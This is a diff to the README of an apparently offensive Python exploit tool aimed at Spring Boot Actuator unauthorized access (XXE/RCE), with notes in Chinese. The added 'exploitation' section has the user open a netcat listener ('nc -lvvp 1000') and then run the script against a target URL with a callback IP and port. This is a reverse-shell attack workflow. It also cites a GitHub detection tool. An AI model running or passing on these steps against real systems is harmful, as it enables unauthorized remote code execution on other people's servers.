@@ -23,10 +23,12 @@ python spring_boot_exp.py -u http://127.0.0.1:8090
 
 利用：
 ```angular2
+ 监听端口
+ nc -lvvp 1000
  python spring_boot_exp.py -u http://127.0.0.1:8090 -exp xx.x.xx.x -p 1000
 ```
 
-## 参考资料
+## 参考资料 
 Spring Boot Actuator未授权访问【XXE、RCE】单/多目标检测
 * https://github.com/rabbitmask/SB-Actuator
 
